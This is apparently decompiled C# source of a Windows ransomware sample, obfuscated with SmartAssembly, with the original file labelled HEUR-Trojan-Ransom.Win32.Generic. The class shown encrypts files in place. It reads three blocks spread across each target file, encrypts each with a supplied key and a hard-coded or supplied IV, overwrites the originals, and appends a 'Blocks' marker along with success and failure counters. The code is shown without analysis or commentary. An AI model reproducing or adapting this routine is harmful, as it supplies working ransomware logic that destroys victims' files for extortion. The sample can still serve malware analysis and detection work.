// Decompiled with JetBrains decompiler
// Type: coxZRmDhvSAWo.GeksFIyCuYbq
// Assembly: Worker-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6E50A6D0-CF23-40BF-9617-750EB84D00C0
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32.Generic-122df846a943e419c3a31f65b6e67e7570134612b2dfd45638e0edd23e214036.exe

using NS001;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using System;
using System.IO;
using System.Text;

namespace coxZRmDhvSAWo
{
  internal sealed class GeksFIyCuYbq
  {
    [NonSerialized]
    internal static GetString f000053;

    public static int zfvsLOKxDdoz(long p0) => (int) p0;

    public static bool uVsAlcvYzOr(
      string sWwzrmNOHrjr,
      string p1,
      string RzLPPlGazddiOk,
      byte[] btlcMmBbizmbR = null,
      byte[] p4 = null)
    {
      bool flag;
      try
      {
        using (FileStream fileStream = new FileStream(sWwzrmNOHrjr, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
        {
          int num1 = GeksFIyCuYbq.zfvsLOKxDdoz(fileStream.Length) / 3;
          if (num1 < 0)
            num1 *= -1;
          int num2;
          try
          {
            num2 = Convert.ToInt32(p1) * Convert.ToInt32(fileStream.Length) / 100 / 2;
            if (num2 < 0)
              num2 *= -1;
          }
          catch
          {
            num2 = 107374182;
          }
          if (num1 <= num2 - Convert.ToInt32(p1) * 1024 * 1024)
            num2 = (num1 - Convert.ToInt32(p1) * 1024 * 1024) / 10;
          int cNqbpbzcNfoE = (int) Math.Round((double) num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
          for (int index = 0; index < 3; ++index)
          {
            byte[] p0 = GeksFIyCuYbq.m00002c(sWwzrmNOHrjr, fileStream, cNqbpbzcNfoE, num1 * index);
            byte[] NfSloiNLiflBY;
            if (!GhAMvbuoccW.uBIPmjbCjNt)
              NfSloiNLiflBY = c000018.SvtZMRYDytMixf(p0, Convert.FromBase64String(RzLPPlGazddiOk), new byte[8]
              {
                (byte) 1,
                (byte) 2,
                (byte) 3,
                (byte) 4,
                (byte) 5,
                (byte) 6,
                (byte) 7,
                (byte) 8
              });
            else
              NfSloiNLiflBY = sAdFSOOagDt.m00002a(p0, Convert.FromBase64String(RzLPPlGazddiOk), p4);
            GeksFIyCuYbq.m00002d(sWwzrmNOHrjr, fileStream, NfSloiNLiflBY, num1 * index);
          }
        }
        byte[] buffer = GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes("Blocks" + "+" + Convert.ToString(p1) + "+") : Encoding.ASCII.GetBytes("Blocks" + "-" + Convert.ToString(p1) + "-");
        if (!GhAMvbuoccW.PAOJgADrbjEa)
        {
          using (FileStream fileStream = new FileStream(sWwzrmNOHrjr, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
            fileStream.Write(buffer, 0, buffer.Length);
        }
        else
        {
          using (FileStream fileStream = new FileStream(sWwzrmNOHrjr, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
          {
            fileStream.Write(btlcMmBbizmbR, 0, btlcMmBbizmbR.Length);
            fileStream.Write(buffer, 0, buffer.Length);
          }
        }
      }
      catch (Exception ex1)
      {
        if (GhAMvbuoccW.CCDyMIHlAe)
        {
          try
          {
            File.AppendAllText(GhAMvbuoccW.f000025, "File: " + sWwzrmNOHrjr + " - Error creating filestream for block process or read-write: " + ex1.Message + "\r\n");
          }
          catch (Exception ex2)
          {
          }
        }
        ++GhAMvbuoccW.f00002a;
        flag = false;
        goto label_34;
      }
      ++GhAMvbuoccW.f00002b;
      flag = true;
label_34:
      return flag;
    }

    public static byte[] m00002c(
      string p0,
      FileStream nIgpxCOkjaTzOR,
      int cNqbpbzcNfoE,
      int oumwHMpqaKokqf = 0)
    {
      byte[] buffer = new byte[cNqbpbzcNfoE];
      nIgpxCOkjaTzOR.Position = (long) oumwHMpqaKokqf;
      nIgpxCOkjaTzOR.Read(buffer, 0, cNqbpbzcNfoE);
      return buffer;
    }

    public static void m00002d(
      string ubHsHEvjIWVrU,
      FileStream p1,
      byte[] NfSloiNLiflBY,
      int SVkQcfzuIqzlj = 0)
    {
      p1.Position = (long) SVkQcfzuIqzlj;
      p1.Write(NfSloiNLiflBY, 0, NfSloiNLiflBY.Length);
    }

    static GeksFIyCuYbq() => Strings.CreateGetStringDelegate(typeof (GeksFIyCuYbq));
  }
}
